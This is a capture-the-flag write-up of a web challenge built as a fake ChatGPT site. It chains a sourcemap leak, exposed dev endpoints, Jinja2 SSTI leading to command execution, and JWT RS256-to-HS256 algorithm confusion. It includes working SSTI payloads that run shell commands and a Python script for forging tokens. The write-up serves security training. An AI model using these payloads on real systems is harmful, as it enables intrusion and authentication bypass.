# boroGPT - boroCTF

> *Introducing boroGPT, boroAI's cutting-edge large language model that will revolutionize the way you think about chatbots! Our engineers have been hard at work building the most secure, scalable, and enterprise-ready AI platform the world has ever seen!*

**Difficulty:** Medium

**Category:** Web Exploitation

**Attack Chain:** `Information Disclosure` → `JWT Algorithm Confusion` → `SSTI` → `RCE`

---

## What Was Vulnerable

The external JavaScript file leaked the application's sourcemap, exposing legacy development endpoints and the headers required to access them. These endpoints disclosed a user list containing a debug admin JWT token and a publicly accessible JWKS endpoint with the RSA public key. The template rendering endpoint was vulnerable to Server-Side Template Injection, allowing Jinja2 sandbox escape and Remote Code Execution. The JWT implementation was also vulnerable to algorithm confusion - accepting HS256 tokens signed with the RSA public key as the HMAC secret, allowing token forgery without the private key.

---

## How I Found It

### 1. Reconnaissance

The website is a copy of ChatGPT. Every prompt returns generic responses:

- *"I'm sorry, I can't help with that."*
- *"As boroGPT-4o, I'm designed to assist with a wide range of tasks. However, this falls outside what I'm able to help with."*
- *"Interesting! Let me provide some context on that."*

![Screenshot 1 - boroGPT chat interface](screenshots/01-chat-interface.png)

Viewing the page source revealed internal and external JavaScript. The internal JS handled UI logic. The external JS was more interesting - it was minified but contained a critical comment at the bottom:

```javascript
//# sourceMappingURL=main.js.map
```

![Screenshot 2 - Page source showing sourceMappingURL reference](screenshots/02-page-source-sourcemap.png)

#### What is a sourceMappingURL?

A `sourceMappingURL` is a special comment added to a JavaScript file that tells browsers and developer tools where to find the corresponding source map file.

```javascript
//# sourceMappingURL=main.js.map
```

This indicates that `main.js` is likely a minified version of the original source code. The referenced `.map` file contains metadata mapping the generated JavaScript back to the original source files, making debugging easier for developers.

**Why is it interesting during security testing?** If source map files are publicly accessible, they may reveal information not visible in the minified JavaScript - internal file paths, endpoint names, comments, and development code that was never intended to ship to production.

---

### 2. Accessing the Source Map

`/main.js.map` returned 404. Trying `/static/main.js.map` with GET returned the full source map:

![Screenshot 3 - GET /static/main.js.map response](screenshots/03-sourcemap-response.png)

```json
{
    "version": 3,
    "file": "main.js",
    "sources": [
        "src/index.js",
        "src/api/client.js",
        "src/components/chat.js",
        "src/components/sidebar.js",
        "src/utils/dom.js"
    ],
    "sourcesContent": [
        "...",
        "// Legacy dev client - DO NOT SHIP\nconst devFetch = (endpoint, options = {}) => {\n  return fetch(endpoint, {\n    ...options,\n    headers: {\n      ...options.headers,\n      \"X-Dev-Mode\": \"true\"\n    }\n  });\n};\n\nexport const getUsers = () => devFetch(\"/api/v0/users\");\nexport const renderTemplate = (template, token) => devFetch(\"/api/v0/render\", {\n  method: \"POST\",\n  headers: { \"Authorization\": `Bearer ${token}` },\n  body: JSON.stringify({ template })\n});\n\nexport const getJWKS = () => devFetch(\"/api/v0/jwks\");\n",
        "..."
    ]
}
```

The `sourcesContent` array contains a comment - **"Legacy dev client - DO NOT SHIP"** - and reveals three endpoints:

- `GET /api/v0/users` - requires header `X-Dev-Mode: true`
- `POST /api/v0/render` - requires header `X-Dev-Mode: true`, `Authorization: Bearer <token>` and body `{ template }`
- `GET /api/v0/jwks` - requires header `X-Dev-Mode: true`

---

### 3. Information Disclosure

Sending requests to the legacy endpoints without the `X-Dev-Mode: true` header returned 404.
With the header:

**`GET /api/v0/users`** returned the full user list including a debug admin token:

![Screenshot 4 - GET /api/v0/users response with leaked admin token](screenshots/04-users-endpoint.png)

```json
[
  {"email": "alice@borocorp.io", "id": 1, "role": "user", "username": "alice"},
  {"email": "bob@borocorp.io", "id": 2, "role": "user", "username": "bob"},
  {"email": "carol@borocorp.io", "id": 3, "role": "moderator", "username": "carol"},
  {
    "_note": "debug session token",
    "email": "admin@borocorp.io",
    "id": 4,
    "role": "admin",
    "sample_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...",
    "username": "admin"
  }
]
```

**`GET /api/v0/jwks`** returned the RSA public key:

![Screenshot 5 - GET /api/v0/jwks response](screenshots/05-jwks-endpoint.png)

```json
{
  "keys": [{
    "alg": "RS256",
    "e": "AQAB",
    "kid": "borogpt-key-v1",
    "kty": "RSA",
    "n": "npug_-n-aYTHAhguDSVmH1Y41L4T3P6zGO668aFlt869...",
    "use": "sig"
  }]
}
```

#### What is JWKS?

A JSON Web Key Set (JWKS) is a JSON document containing one or more public keys used to verify JWT signatures.

| Field | Meaning |
|-------|---------|
| `kty` | Key Type (RSA, EC, etc.) |
| `kid` | Key ID |
| `alg` | Algorithm |
| `use` | Intended use (`sig` = signature) |
| `n`   | RSA modulus |
| `e`   | RSA exponent |

---

## The Exploit

### Step 1 - Accessing the Render Endpoint

`POST /api/v0/render` without authorization returned `401 Unauthorized`. Using the leaked admin `sample_token` with `X-Dev-Mode: true`:

```
POST /api/v0/render
X-Dev-Mode: true
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...

{"template":"hello"}
```

Response: `{"output":"hello"}`

![Screenshot 6 - POST /api/v0/render echo response](screenshots/06-render-echo.png)

Output is echoed but not evaluated. This doesn't confirm SSTI yet.

### Step 2 - SSTI Confirmation

```json
{"template":"{{7*7}}"}
```

Response: `{"output":"49"}`

![Screenshot 7 - {{7*7}} returning 49, SSTI confirmed](screenshots/07-ssti-confirmed.png)

Template code is being evaluated - **Jinja2 SSTI confirmed**.

### Step 3 - Enumerating the Template Context

Checking if the Flask configuration is accessible:

```json
{"template":"{{ config }}"}
```

![Screenshot 8 - Flask config dump](screenshots/08-config-dump.png)

`SECRET_KEY` was `None`, so session forgery via the secret key was not applicable here.

### Step 4 - Jinja2 Sandbox Escape to RCE

The standard Jinja2 SSTI → RCE chain walks through Python's built-in object introspection to reach the `os` module:

```
Template Object → Python Object → Global Namespace → Built-in Functions → Import Modules → OS Access
```

**Listing the root directory:**

```json
{"template":"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls /').read() }}"}
```

![Screenshot 9 - ls / output showing flag.txt](screenshots/09-ls-root.png)

```
app bin boot dev etc flag.txt generate_keys.py home keys lib ...
```

**Reading the flag:**

```json
{"template":"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}"}
```

![Screenshot 10 - cat /flag.txt returning the flag](screenshots/10-flag.png)

```
boroCTF{pub1ic_k3y_g0es_both_ways}
```

---

### Step 5 - JWT Algorithm Confusion (Intended Path)

The flag text *"public key goes both ways"* hints that the intended solution involved forging the admin token via JWT algorithm confusion rather than using the leaked `sample_token` directly. We found a shortcut - but completing the intended path demonstrates a more significant vulnerability.

**The vulnerability:** The server uses RS256 (asymmetric - signed with private key, verified with public key). If the JWT library trusts the algorithm declared in the token header, an attacker can switch to HS256 (symmetric - signed and verified with the same key). Since the RSA public key is publicly available via `/jwks`, it becomes the known HMAC secret. The attacker can now forge valid tokens without the private key.

**The exploit script:**

```python
import json
import base64
import hmac
import hashlib
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives import serialization

def b64url_decode(s):
    padding = '=' * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + padding)

def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=')

# Extract RSA public key components from JWKS
n = b64url_decode("npug_-n-aYTHAhguDSVmH1Y41L4T3P6zGO668aFlt869c54nzkCrH38z1uBCQd4VADsDS_0RluPvZxyRRTQnxrJvksN8mUV4WPvHdRnBT83JPZs2n15qAC_nTdtK37b6UNErORB8XAcK0SNfsg9d-xArqXIRop2EMR9yAmTqxPWhyYG_myrXLXWrnCIz0e8n1UzJGUwH88_IYljYomrdQXaz36x6kcCqEvNNolGx0tuv9d7R2m1YnYXvhYzSh8BlyKX0GFsQhDpyiHAYlCzFawrl6RA4KWO2ZcebINvvwlhozMBsQM0woUqUEIdAgM4n9fbMgoUf8pLPhDTRmeGPzw")
e = b64url_decode("AQAB")

n_int = int.from_bytes(n, 'big')
e_int = int.from_bytes(e, 'big')

# Reconstruct RSA public key and convert to PEM
public_key = RSAPublicNumbers(e_int, n_int).public_key()
pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

# Forge an HS256 token using the RSA public key as the HMAC secret
header = {"alg": "HS256", "typ": "JWT"}
payload = {"sub": "admin", "role": "admin", "iss": "borogpt-dev"}

header_b64 = b64url_encode(json.dumps(header, separators=(',', ':')).encode())
payload_b64 = b64url_encode(json.dumps(payload, separators=(',', ':')).encode())

signing_input = header_b64 + b'.' + payload_b64
signature = hmac.new(pem, signing_input, hashlib.sha256).digest()
signature_b64 = b64url_encode(signature)

token = (signing_input + b'.' + signature_b64).decode()
print(f"Forged Token: {token}")
```

**Note:** PyJWT v2+ rejects PEM keys for HMAC signing as a safety check, so this script uses Python's built-in `hmac` module to construct the JWT manually - bypassing the library restriction while achieving the same result.

**Using the forged token:**

```
POST /api/v0/render
X-Dev-Mode: true
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

{"template":"hello"}
```

Response: `{"output":"hello"}` - **200 OK**

![Screenshot 11 - Forged HS256 token accepted, 200 OK response](screenshots/11-algorithm-confusion.png)

The forged token was accepted. The server verified an HS256 token using the RSA public key as the HMAC secret - algorithm confusion confirmed.

---

## Techniques Used

1. **Sourcemap leak** - exposed legacy dev endpoints and required headers
2. **Information disclosure** - `X-Dev-Mode` header unlocked a user list with a leaked admin JWT and JWKS public key
3. **SSTI discovery** - `{{7*7}}` → `49` confirmed Jinja2 template evaluation
4. **SSTI → RCE** - Jinja2 sandbox escape via `self.__init__.__globals__.__builtins__.__import__`
5. **JWT algorithm confusion** - RS256 → HS256, forging valid admin tokens using only the public key

---

## Real World Impact

In a real application, an exposed sourcemap containing legacy development endpoints could allow an attacker to steal user credentials, retrieve authentication tokens, read arbitrary server files, and achieve full remote code execution - all starting from a single publicly accessible `.map` file that most developers never think to restrict.

---

## Lessons Learned

1. Sourcemaps left publicly accessible in production are reconnaissance goldmines - restrict or remove them before deployment
2. Read all comments and code thoroughly - the `X-Dev-Mode` header was hidden in a code comment that was easy to miss
3. A JWKS endpoint reveals the entire authentication infrastructure: key identifiers, signing algorithms, and public keys
4. SSTI is only confirmed when code is evaluated, not just echoed - `{{7*7}}` → `49` is the proof
5. Always develop an escalation path - SSTI confirmation is just the start, the goal is RCE
6. JWT algorithm confusion is a critical vulnerability class: if a server trusts the algorithm declared in the token header, the entire authentication chain can be bypassed with only a public key
7. PEM (Privacy Enhanced Mail) is a standard text representation of cryptographic keys - recognizing PEM format is essential when working with RSA keys, JWTs, and TLS certificates

---

*Written by [Faisal Ulde](https://github.com/faisalulde) | boroCTF 2026*
